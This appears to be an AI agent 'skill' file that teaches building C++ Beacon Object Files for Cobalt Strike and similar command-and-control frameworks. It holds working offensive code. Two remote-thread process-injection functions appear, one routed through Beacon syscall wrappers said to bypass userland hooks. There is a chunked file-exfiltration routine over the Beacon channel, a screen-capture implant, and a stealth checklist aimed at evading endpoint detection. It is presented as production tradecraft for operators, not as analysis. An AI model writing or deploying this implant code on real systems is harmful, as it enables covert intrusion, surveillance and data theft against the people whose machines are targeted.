---
name: cpp-bof
description: "Generate, compile, and harden Beacon Object Files (BOF) in C++ for Cobalt Strike and compatible C2 frameworks. Use when creating a C++ BOF, leveraging RAII/templates/classes without runtime dependencies, using typedef+GetProcAddress DFR, integrating COM/GDI+, implementing dual-build (BOF+EXE), and improving structure, quality, and stealth posture."
license: MIT
compatibility: "Requires x86_64-w64-mingw32-g++ (mingw-w64), python3. Scripts tested on Linux/WSL. BOF testing requires a COFF loader (COFFLoader, RunOF, or framework-specific loader)."
metadata:
  author: AeonDave
  version: "3.0"
  category: bof
  language: cpp
---

# C++ Beacon Object Files (BOF) — Development & Hardening

This skill produces production-quality, OPSEC-conscious BOFs in C++.
Patterns are framework-agnostic and suitable for BOF-compatible COFF loaders.
C++ is used deliberately for structure and safety (RAII, scoped abstractions,
type discipline) while remaining runtime-free.

## When to use

- User says *"create a C++ BOF"* or *"write a BOF using classes"*
- Complex Win32/COM/GDI+ logic that benefits from C++ wrappers
- Need RAII patterns for automatic handle/resource cleanup inside BOFs
- Converting existing C++ code into a BOF
- Need dual-build support (`#ifdef BOF` / standalone EXE)
- Need practical stealth guidance while staying generic to different BOF loaders

---

## Recommended workflow

1. **Scope** — define target, privilege, execution model, and API surface
2. **Skeleton** — create runtime-free C++ BOF scaffold (`extern "C" go`)
3. **Implement** — add RAII wrappers and explicit cleanup boundaries
4. **Harden** — apply DFR minimization and OPSEC checks
5. **Compile** — enforce no-exception/no-RTTI profile
6. **Validate** — test on at least one local COFF loader plus target framework

---

## Key differences from C BOFs

| Aspect | C BOF | C++ BOF |
|--------|-------|---------|
| Compiler | `x86_64-w64-mingw32-gcc` | `x86_64-w64-mingw32-g++` |
| Entry point | `void go(char*, int)` | `extern "C" void go(char*, int)` |
| Exceptions | N/A | **Must be disabled** (`-fno-exceptions`) |
| RTTI | N/A | **Must be disabled** (`-fno-rtti`) |
| STL | N/A | **Do not use** — no C++ runtime in BOFs |
| Constructors | N/A | Static/global constructors will **not** run |

> **Critical rule:** A C++ BOF must not depend on the C++ runtime (`libstdc++`).
> No `new`/`delete`, no STL containers, no exceptions, no RTTI.

---

## Step 1 — File header and structure

```cpp
/**
 * @file       mybof.cpp
 * @brief      One-line description.
 *
 * Technique:  Name of technique / tradecraft
 * MITRE ATT&CK: T1113 (Screen Capture) — example
 * Target:     x86_64 Windows 10/11, Server 2016+
 *
 * Build:
 *   ../scripts/build_bof.sh mybof.cpp
 */

#include <windows.h>

extern "C" {
#include "beacon.h"
}
```

---

## Step 2 — DFR strategies

### Strategy A: Standard DECLSPEC_IMPORT (recommended for < ~30 imports)

```cpp
/* ── KERNEL32 ─────────────────────────────────────────── */
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
```

### Strategy B: typedef + GetProcAddress (for many imports or non-standard DLLs)

When you have many API calls (30+), DECLSPEC_IMPORT DFR can hit linker
limits. Use typedefs and resolve at runtime:

```cpp
/* ── Typedefs for runtime resolution ──────────────────── */
typedef HGDIOBJ (WINAPI *fnSelectObject)(HDC, HGDIOBJ);
typedef BOOL    (WINAPI *fnBitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
typedef int     (WINAPI *fnGetSystemMetrics)(int);

/* ── Global function pointers ─────────────────────────── */
static fnSelectObject   pSelectObject   = NULL;
static fnBitBlt         pBitBlt         = NULL;
static fnGetSystemMetrics pGetSystemMetrics = NULL;

static BOOL ResolveAPIs(void) {
    HMODULE hGdi32  = KERNEL32$LoadLibraryA("gdi32.dll");
    HMODULE hUser32 = KERNEL32$LoadLibraryA("user32.dll");
    if (!hGdi32 || !hUser32) return FALSE;

    pSelectObject     = (fnSelectObject)KERNEL32$GetProcAddress(hGdi32, "SelectObject");
    pBitBlt           = (fnBitBlt)KERNEL32$GetProcAddress(hGdi32, "BitBlt");
    pGetSystemMetrics = (fnGetSystemMetrics)KERNEL32$GetProcAddress(hUser32, "GetSystemMetrics");

    return (pSelectObject && pBitBlt && pGetSystemMetrics);
}
```

Call `ResolveAPIs()` at the top of `go()` before using any resolved pointer.

> **When to use Strategy B:** GDI+, DirectX, COM interfaces, or any DLL not
> commonly linked (gdiplus.dll, d3d11.dll, wlanapi.dll).

---

## Step 3 — RAII wrappers

C++ shines in BOFs with RAII for automatic cleanup. All wrappers live in the
`bof` namespace (see `assets/bof_helpers.hpp`):

```cpp
#include "bof_helpers.hpp"

/* Usage: */
bof::Handle hProc(KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid));
if (!hProc.valid()) { /* error */ }
/* hProc auto-closed by destructor */
```

Available wrappers: `bof::Handle`, `bof::HeapBuf`, `bof::Format`, `bof::RegKey`.
See `references/cpp-raii.md` for the full library and factory RAII patterns.

---

## Step 4 — Compilation

```bash
./scripts/build_bof.sh mybof.cpp
```

| Flag | Purpose |
|------|---------|
| `-m64 -c` | Target x64, compile only |
| `-fno-exceptions` | Disable C++ exceptions (no runtime) |
| `-fno-rtti` | Disable RTTI (no `typeid`, `dynamic_cast`) |
| `-fno-asynchronous-unwind-tables` | Reduce `.eh_frame` |
| `-fpack-struct=8` | Match Beacon struct packing |
| `-std=c++17` | Modern C++ features |

---

## Structure and quality rules

- Keep `go()` thin: parse args, call 1 orchestration function, return
- Put heavy logic in small static helpers with explicit input/output contracts
- RAII wrappers must be move-safe or non-copyable; avoid hidden ownership transfer
- Build each BOF as one operational unit (clear mode table + consistent error model)
- Prefer deterministic cleanup labels for mixed C/C++ resources
- Keep logging compact and operator-focused (status + key IDs)

Suggested file layout inside one source file:

1. Header / protocol comment
2. DFR declarations or resolver typedefs
3. Tiny RAII wrappers (`Handle`, `HeapBuf`, `Format`)
4. Technique helpers
5. `run_mode_*` functions
6. `go()` entrypoint

---

## Stealthness checklist (generic)

- [ ] No exceptions, RTTI, STL, iostreams, or hidden runtime pulls
- [ ] No persistent RWX mappings; use RW → RX transitions
- [ ] Minimized import surface (DFR or runtime resolve)
- [ ] No static `syscall` instruction in BOF-generated code paths
- [ ] Encrypted payload material zeroized after use
- [ ] No hardcoded workstation-specific paths or usernames
- [ ] Error paths release every handle and heap allocation

For deeper guidance see `references/stealth-and-opsec.md`.

### Indirect syscalls via Beacon API (CS 4.10+)

When targeting Cobalt Strike 4.10+, prefer Beacon syscall wrappers over
direct ntdll calls. These wrappers follow the framework's configured syscall
strategy (direct, indirect, or patched) without embedding `syscall` instructions
in BOF code.

```cpp
/* ── Beacon syscall wrappers (CS 4.10+) ───────────────── */
/* These are resolved by the Beacon loader, not via DFR    */
extern "C" {
DECLSPEC_IMPORT NTSTATUS NTAPI BeaconGetSyscallInformation(LPVOID, DWORD);
DECLSPEC_IMPORT HANDLE   WINAPI BeaconVirtualAllocEx(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL     WINAPI BeaconVirtualProtectEx(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL     WINAPI BeaconWriteProcessMemory(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
DECLSPEC_IMPORT HANDLE   WINAPI BeaconOpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL     WINAPI BeaconCloseHandle(HANDLE);
}

/* Usage: identical to Win32 counterparts but routed through
 * the framework's syscall layer, bypassing userland hooks. */
static BOOL inject_with_syscalls(DWORD pid, BYTE* payload, SIZE_T sz) {
    bof::Handle hProc(BeaconOpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid));
    if (!hProc.valid()) return FALSE;

    LPVOID remoteBuf = BeaconVirtualAllocEx(hProc, NULL, sz,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteBuf) return FALSE;

    BeaconWriteProcessMemory(hProc, remoteBuf, payload, sz, NULL);

    DWORD oldProt;
    BeaconVirtualProtectEx(hProc, remoteBuf, sz, PAGE_EXECUTE_READ, &oldProt);

    KERNEL32$CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL);
    return TRUE;
}
```

When Beacon wrappers are unavailable, see `references/stealth-and-opsec.md`
for InlineWhispers3 integration as a fallback.

---

## Advanced patterns

### Dual-build: BOF + standalone EXE

Support both BOF and standalone compilation in the same source:

```cpp
#ifdef BOF
extern "C" {
#include "beacon.h"
}
#define PRINT(fmt, ...) BeaconPrintf(CALLBACK_OUTPUT, fmt, ##__VA_ARGS__)
#define PRINT_ERR(fmt, ...) BeaconPrintf(CALLBACK_ERROR, fmt, ##__VA_ARGS__)
#else
#include <stdio.h>
#define PRINT(fmt, ...) printf(fmt "\n", ##__VA_ARGS__)
#define PRINT_ERR(fmt, ...) fprintf(stderr, fmt "\n", ##__VA_ARGS__)
#endif

void do_work(int pid) {
    PRINT("[+] Processing PID %d", pid);
    /* ... logic works in both modes ... */
}

#ifdef BOF
extern "C" void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    do_work(BeaconDataInt(&parser));
}
#else
int main(int argc, char** argv) {
    if (argc < 2) return 1;
    do_work(atoi(argv[1]));
    return 0;
}
#endif
```

Compile as BOF: `build_bof.sh mybof.cpp` (adds `-DBOF` automatically).
Compile as EXE: `x86_64-w64-mingw32-g++ -o mybof.exe mybof.cpp`.

### File download over Beacon channel

Use `CALLBACK_FILE*` constants for chunked file transfer:

```cpp
static void downloadFile(const char* fileName, const char* data, int dataLen) {
    /* Start download — send filename */
    int msgLen = (int)MSVCRT$strlen(fileName) + 1;  /* include null */
    char* start = (char*)KERNEL32$HeapAlloc(
        KERNEL32$GetProcessHeap(), 0, 4 + msgLen);
    *(int*)start = msgLen;
    MSVCRT$memcpy(start + 4, fileName, msgLen);
    BeaconOutput(CALLBACK_FILE, start, 4 + msgLen);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, start);

    /* Send data in chunks */
    int offset = 0;
    while (offset < dataLen) {
        int chunk = dataLen - offset;
        if (chunk > 900 * 1024) chunk = 900 * 1024;  /* 900KB max */
        BeaconOutput(CALLBACK_FILE_WRITE, data + offset, chunk);
        offset += chunk;
    }

    /* Close download */
    BeaconOutput(CALLBACK_FILE_CLOSE, NULL, 0);
}
```

Also available: `CALLBACK_SCREENSHOT` for screenshot data.

### GDI+ / COM integration

Load non-standard DLLs dynamically and resolve flat API:

```cpp
/* GDI+ flat API typedefs */
typedef int (WINAPI *fnGdiplusStartup)(ULONG_PTR*, void*, void*);
typedef void (WINAPI *fnGdiplusShutdown)(ULONG_PTR);
typedef int (WINAPI *fnGdipCreateBitmapFromHBITMAP)(HBITMAP, HPALETTE, void**);
typedef int (WINAPI *fnGdipSaveImageToStream)(void*, CLSID*, void*);

static HMODULE hGdiPlus = NULL;
static fnGdiplusStartup        pGdiplusStartup        = NULL;
static fnGdiplusShutdown       pGdiplusShutdown       = NULL;
static fnGdipCreateBitmapFromHBITMAP pGdipCreateBitmapFromHBITMAP = NULL;

static BOOL ResolveGdiPlus(void) {
    hGdiPlus = KERNEL32$LoadLibraryA("gdiplus.dll");
    if (!hGdiPlus) return FALSE;
    pGdiplusStartup = (fnGdiplusStartup)KERNEL32$GetProcAddress(hGdiPlus, "GdiplusStartup");
    pGdiplusShutdown = (fnGdiplusShutdown)KERNEL32$GetProcAddress(hGdiPlus, "GdiplusShutdown");
    pGdipCreateBitmapFromHBITMAP = (fnGdipCreateBitmapFromHBITMAP)
        KERNEL32$GetProcAddress(hGdiPlus, "GdipCreateBitmapFromHBITMAP");
    return (pGdiplusStartup && pGdiplusShutdown);
}
```

> **Pitfall:** Do NOT use `using namespace Gdiplus;` in BOFs — it creates
> COMDAT section conflicts with the Beacon loader. Use the flat C API
> (`GdipCreateBitmapFromHBITMAP`, etc.) resolved via GetProcAddress.

### COM / IStream usage

```cpp
typedef HRESULT (WINAPI *fnCreateStreamOnHGlobal)(HGLOBAL, BOOL, LPSTREAM*);
static fnCreateStreamOnHGlobal pCreateStreamOnHGlobal = NULL;

/* Resolve from ole32.dll */
HMODULE hOle32 = KERNEL32$LoadLibraryA("ole32.dll");
pCreateStreamOnHGlobal = (fnCreateStreamOnHGlobal)
    KERNEL32$GetProcAddress(hOle32, "CreateStreamOnHGlobal");

IStream* pStream = NULL;
pCreateStreamOnHGlobal(NULL, TRUE, &pStream);
/* ... use pStream ... */
pStream->Release();
```

### What you CAN vs MUST NOT use

| Safe | Unsafe |
|------|--------|
| Classes / structs (stack) | `new` / `delete` |
| RAII (destructors) | STL containers |
| Templates, `constexpr` | `<iostream>`, `<fstream>` |
| `static_assert`, `enum class` | Exceptions (`throw`/`catch`) |
| Namespaces, `auto`, references | RTTI (`dynamic_cast`, `typeid`) |
| Lambda (no capture) | Global objects with constructors |

### Injection patterns

For process injection techniques (remote thread, manual mapping, hollowing,
module stomping, APC), see the **`c-bof`** skill's
`references/injection-patterns.md` — all patterns are C-compatible and work
directly in C++ BOFs. When using them in C++, wrap handles and buffers with
`bof::Handle` and `bof::HeapBuf` for automatic cleanup:

```cpp
/* C++ RAII wrapper around the C injection pattern */
static BOOL inject_cpp(DWORD pid, BYTE* payload, SIZE_T sz) {
    bof::Handle hProc(KERNEL32$OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid));
    if (!hProc.valid()) return FALSE;

    LPVOID remoteBuf = KERNEL32$VirtualAllocEx(hProc, NULL, sz,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteBuf) return FALSE;

    KERNEL32$WriteProcessMemory(hProc, remoteBuf, payload, sz, NULL);
    DWORD oldProt;
    KERNEL32$VirtualProtectEx(hProc, remoteBuf, sz, PAGE_EXECUTE_READ, &oldProt);

    KERNEL32$CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL);
    return TRUE;
    /* hProc auto-closed by bof::Handle destructor */
}
```

---

## Complete example — screenshot.cpp

```cpp
/**
 * @file       screenshot.cpp
 * @brief      Capture screen and send via Beacon channel.
 *
 * Technique:  GDI screen capture + GDI+ JPEG encoding
 * MITRE ATT&CK: T1113 (Screen Capture)
 * Target:     x86_64 Windows 10/11
 */

#include <windows.h>

extern "C" {
#include "beacon.h"
}
#include "bof_helpers.hpp"

/* ── GDI-specific RAII (not in bof_helpers — technique-local) ── */
namespace bof {

class GdiObj {
    HGDIOBJ obj_;
public:
    explicit GdiObj(HGDIOBJ o = NULL) : obj_(o) {}
    ~GdiObj() { if (obj_) pDeleteObject(obj_); }
    operator HGDIOBJ() const { return obj_; }
    GdiObj(const GdiObj&) = delete;
    GdiObj& operator=(const GdiObj&) = delete;
};

class GdiDC {
    HDC hdc_;
    bool own_;  /* true = DeleteDC, false = ReleaseDC(hwnd) */
    HWND hwnd_;
public:
    static GdiDC owned(HDC hdc) { return GdiDC(hdc, true, NULL); }
    static GdiDC borrowed(HDC hdc, HWND hwnd) { return GdiDC(hdc, false, hwnd); }
    ~GdiDC() {
        if (!hdc_) return;
        if (own_) pDeleteDC(hdc_);
        else pReleaseDC(hwnd_, hdc_);
    }
    operator HDC() const { return hdc_; }
    GdiDC(const GdiDC&) = delete;
    GdiDC& operator=(const GdiDC&) = delete;
private:
    GdiDC(HDC hdc, bool own, HWND hwnd) : hdc_(hdc), own_(own), hwnd_(hwnd) {}
};

} /* namespace bof */

/* ── KERNEL32 (DECLSPEC_IMPORT — few calls) ───────────── */
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);

/* ── GDI32 / USER32 (typedef — many calls) ────────────── */
typedef HDC     (WINAPI *fnGetDC)(HWND);
typedef int     (WINAPI *fnReleaseDC)(HWND, HDC);
typedef HDC     (WINAPI *fnCreateCompatibleDC)(HDC);
typedef HBITMAP (WINAPI *fnCreateCompatibleBitmap)(HDC, int, int);
typedef HGDIOBJ (WINAPI *fnSelectObject)(HDC, HGDIOBJ);
typedef BOOL    (WINAPI *fnBitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
typedef BOOL    (WINAPI *fnDeleteObject)(HGDIOBJ);
typedef BOOL    (WINAPI *fnDeleteDC)(HDC);
typedef int     (WINAPI *fnGetSystemMetrics)(int);

static fnGetDC                  pGetDC = NULL;
static fnReleaseDC              pReleaseDC = NULL;
static fnCreateCompatibleDC     pCreateCompatibleDC = NULL;
static fnCreateCompatibleBitmap pCreateCompatibleBitmap = NULL;
static fnSelectObject           pSelectObject = NULL;
static fnBitBlt                 pBitBlt = NULL;
static fnDeleteObject           pDeleteObject = NULL;
static fnDeleteDC               pDeleteDC = NULL;
static fnGetSystemMetrics       pGetSystemMetrics = NULL;

static BOOL ResolveAPIs(void) {
    HMODULE hGdi32  = KERNEL32$LoadLibraryA("gdi32.dll");
    HMODULE hUser32 = KERNEL32$LoadLibraryA("user32.dll");
    if (!hGdi32 || !hUser32) return FALSE;

    pGetDC                  = (fnGetDC)KERNEL32$GetProcAddress(hUser32, "GetDC");
    pReleaseDC              = (fnReleaseDC)KERNEL32$GetProcAddress(hUser32, "ReleaseDC");
    pGetSystemMetrics       = (fnGetSystemMetrics)KERNEL32$GetProcAddress(hUser32, "GetSystemMetrics");
    pCreateCompatibleDC     = (fnCreateCompatibleDC)KERNEL32$GetProcAddress(hGdi32, "CreateCompatibleDC");
    pCreateCompatibleBitmap = (fnCreateCompatibleBitmap)KERNEL32$GetProcAddress(hGdi32, "CreateCompatibleBitmap");
    pSelectObject           = (fnSelectObject)KERNEL32$GetProcAddress(hGdi32, "SelectObject");
    pBitBlt                 = (fnBitBlt)KERNEL32$GetProcAddress(hGdi32, "BitBlt");
    pDeleteObject           = (fnDeleteObject)KERNEL32$GetProcAddress(hGdi32, "DeleteObject");
    pDeleteDC               = (fnDeleteDC)KERNEL32$GetProcAddress(hGdi32, "DeleteDC");

    return (pGetDC && pCreateCompatibleDC && pBitBlt);
}

extern "C" void go(char* args, int len) {
    (void)args; (void)len;

    if (!ResolveAPIs()) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to resolve GDI APIs");
        return;
    }

    int cx = pGetSystemMetrics(0 /* SM_CXSCREEN */);
    int cy = pGetSystemMetrics(1 /* SM_CYSCREEN */);

    /* RAII: all resources auto-cleaned on scope exit */
    bof::GdiDC hdcScreen(bof::GdiDC::borrowed(pGetDC(NULL), NULL));
    bof::GdiDC hdcMem(bof::GdiDC::owned(pCreateCompatibleDC(hdcScreen)));
    bof::GdiObj hBmp(pCreateCompatibleBitmap(hdcScreen, cx, cy));
    HGDIOBJ hOld = pSelectObject(hdcMem, hBmp);

    pBitBlt(hdcMem, 0, 0, cx, cy, hdcScreen, 0, 0, 0x00CC0020 /* SRCCOPY */);

    /* TODO: encode hBmp to JPEG via GDI+ flat API, then:
     * BeaconOutput(CALLBACK_SCREENSHOT, jpegData, jpegLen);
     */

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Captured %dx%d screen", cx, cy);

    /* Restore original selection before GdiObj destructor runs */
    pSelectObject(hdcMem, hOld);
    /* All handles freed automatically by RAII destructors */
}
```

---

## Support files

| File | Description |
|------|-------------|
| `scripts/bof_template.cpp`         | Production C++ BOF skeleton with RAII + DFR |
| `scripts/build_bof.sh`             | Compiler wrapper with C++ flags |
| `references/cpp-raii.md`           | RAII patterns, safe C++ feature matrix, pitfalls |
| `references/dfr-and-resolution.md` | DFR strategies for C++ BOFs, typedef+GetProcAddress, COM/GDI+ |
| `references/stealth-and-opsec.md`  | OPSEC hardening for C++ BOFs, dual-build, memory hygiene |
| `references/REFERENCE.md`          | C++ BOF patterns, DFR reference, pitfalls |
| `assets/beacon.h`                  | Official Cobalt Strike beacon header (CS 4.12) |
| `assets/beacon_compatibility.h`    | Convenience macros, missing mingw typedefs |
| `assets/bof_helpers.hpp`           | RAII wrappers and utility templates for C++ BOFs |
